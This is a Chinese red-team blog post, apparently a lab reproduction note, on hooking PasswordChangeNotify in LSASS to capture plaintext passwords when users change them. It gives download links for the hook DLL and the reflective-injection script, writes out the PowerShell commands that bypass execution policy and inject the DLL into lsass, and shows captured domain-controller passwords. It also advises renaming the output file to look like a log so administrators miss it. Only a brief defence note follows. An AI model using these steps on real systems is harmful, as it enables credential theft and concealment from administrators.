> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/WwsFu3hnRJszot5CenyPKg)

渗透攻击红队

一个专注于红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg)

  

  

大家好，这里是 **渗透攻击红队** 的第 **40** 篇文章，本公众号会记录一些我学习红队攻击的复现笔记（由浅到深），不出意外每天一更

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4T65TNkYZsPg2BJ2VwibZicuBhV9DGqxlsxwG0n2ibhLuBsiamU7S0SqvAp6p33ucxPkuiaDiaKD6ibJGaQ/640?wx_fmt=gif)

Hook PasswordChangeNotify

Hook PasswordChangeNotify 的作用是当用户修改密码后在系统中进行同步。

攻击者可以利用该功能获取用户修改密码时输入的密码明文。

在修改密码时，用户输入新密码后，LSA 会调用 PasswordFileter 来检查该密码是否符合复杂性要求，如果密码符合要求，LSA 会调用 PasswordChangeNotify，在系统中同步密码。

**Hook PasswordChangeNotify**

**实验操作**

#### Hook dll 

下载连接：https://github.com/clymb3r/Misc-Windows-Hacking

使用 VS 2019 的开发环境，MFC 设置为在静态库中使用 MFC 编译工程，生成 HookPasswordChange.dll。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLz3WSAXDydiayVWy3X32icJckDgScABAb3F264bkXGKRiaNbMMgDXCLjvoDqWpLKJOq0aKD7bUtcAng/640?wx_fmt=png)

```
下载脚本：
https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1
```

首先需要 Invoke-ReflectivePEInjection.ps1 脚本将 HookPasswordChange.dll 注入内存，在目标系统中启动管理员权限的 Powershell：  

```
Set-ExecutionPolicy bypass
Import-Module .\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLz3WSAXDydiayVWy3X32icJcLZkIib74uoqUAlIKaoYv9G2auPHibByicQs9QwWcooXJ3jrfn9wzGUn6w/640?wx_fmt=png)

这个时候没有报错就说明成功了，最后我们手动改一次域控的密码：Admin123456

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLz3WSAXDydiayVWy3X32icJcny2URv0dyzAmzKUG1zP9QxmULseUmXEdbP2ABK5HpOfPnpHIF5VvVA/640?wx_fmt=png)

更改成功后，我们在 C:\Windows\Temp 可以找到文件：passwords.txt  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLz3WSAXDydiayVWy3X32icJc8frVMib1ibErBVHZhynpzqeNsicibWRjibwyKAbmD9gwVTVp1H3Z1VszxkQ/640?wx_fmt=png)

此时可以看到域控的密码为：Admin123456

如果想要更改 passwords.txt 存放路径的话，那么更改 HookPasswordChange.cpp 代码的 132 行 为你想要生成的路径即可：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLz3WSAXDydiayVWy3X32icJcibudnArHa2QQlLicPH5u1qTpuPDNewTrFPTYFK5rFxETRC0icUFywEdvw/640?wx_fmt=png)

我修改为 windows.log 误以为让管理员知道是 log 文件，随后再次执行：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLz3WSAXDydiayVWy3X32icJcCIWFJNXQQSw0BTbEGwXKOzDVjy9zCY6WFvpGg8iaTQib3Bn9bGaSScUg/640?wx_fmt=png)

之后更改密码为：Admin1234567

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLz3WSAXDydiayVWy3X32icJcUQcOSo28FqB9C8jI3vJWruu1VtgJY6P7EDRWWQPR5bQnCBfYnerWtQ/640?wx_fmt=png)

这样就能在 windows.log 文件中查看到域控更改的密码！  

* * *

**防御措施**

使用 Hook PasswordChangeNotify 方法不需要重启系统、不会在系统磁盘中留下 DLL 文件、不需要修改注册表。

如果 PasswordChangeNotify 被攻击者利用，网络管理员是很难检测到的。

防御措施就是：对 Powershell 进行严格的监视。

* * *

参考文章：  

https://www.cnblogs.com/xiaoxiaosen/p/13537305.html

https://github.com/clymb3r/PowerShell

https://github.com/clymb3r/Misc-Windows-Hacking

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDdjBqfzUWVgkVA7dFfxUAATDhZQicc1ibtgzSVq7sln6r9kEtTTicvZmcw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDY9HXLCT5WoDFzKP1Dw8FZyt3ecOVF0zSDogBTzgN2wicJlRDygN7bfQ/640?wx_fmt=png)

点分享

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDRwPQ2H3KRtgzicHGD2bGf1Dtqr86B5mspl4gARTicQUaVr6N0rY1GgKQ/640?wx_fmt=png)

点点赞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDgRo5uRP3s5pLrlJym85cYvUZRJDlqbTXHYVGXEZqD67ia9jNmwbNgxg/640?wx_fmt=png)

点在看